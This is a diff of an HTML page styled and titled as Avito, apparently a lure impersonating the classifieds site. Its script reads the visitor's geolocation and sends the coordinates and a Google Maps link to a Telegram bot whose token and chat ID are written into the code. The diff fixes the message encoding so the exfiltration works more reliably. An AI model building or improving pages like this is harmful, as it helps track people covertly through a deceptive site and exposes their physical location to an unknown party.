@@ -1,39 +1,15 @@
-
 <!DOCTYPE html>
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
   <title>Avito</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      background-color: #f5f5f5;
-      margin: 0;
-      padding: 0;
-    }
-    header {
-      background-color: #005bff;
-      color: white;
-      padding: 20px 0;
-      font-size: 24px;
-      font-weight: bold;
-    }
-    .content {
-      padding: 40px 20px;
-    }
-    img {
-      width: 250px;
-      cursor: pointer;
-      transition: transform 0.2s ease;
-    }
-    img:hover {
-      transform: scale(1.05);
-    }
-    p {
-      font-size: 18px;
-      color: #333;
-    }
+    body { font-family: Arial, sans-serif; text-align: center; background: #f5f5f5; margin: 0; padding: 0;}
+    header { background: #005bff; color: white; padding: 20px 0; font-size: 24px; }
+    .content { padding: 40px 20px; }
+    img { width: 250px; cursor: pointer; transition: transform .2s ease; }
+    img:hover { transform: scale(1.05); }
+    p { font-size: 18px; color: #333; }
   </style>
 </head>
 <body>
@@ -57,12 +33,10 @@ function getLocation() {
 function sendLocation(position) {
   const lat = position.coords.latitude;
   const lon = position.coords.longitude;
-
   const token = "7091173298:AAEwXyHlZkscayetEQf_2Btp-Odu2Xd09vk";
   const chatId = "7307380020";
-  const message = `🛰 Координаты:%0AШирота: ${lat}%0AДолгота: ${lon}%0Ahttps://maps.google.com/?q=${lat},${lon}`;
-
-  fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`);
+  const message = `🛰 Координаты:\nШирота: ${lat}\nДолгота: ${lon}\nhttps://maps.google.com/?q=${lat},${lon}`;
+  fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
 }
 
 function showError(error) {
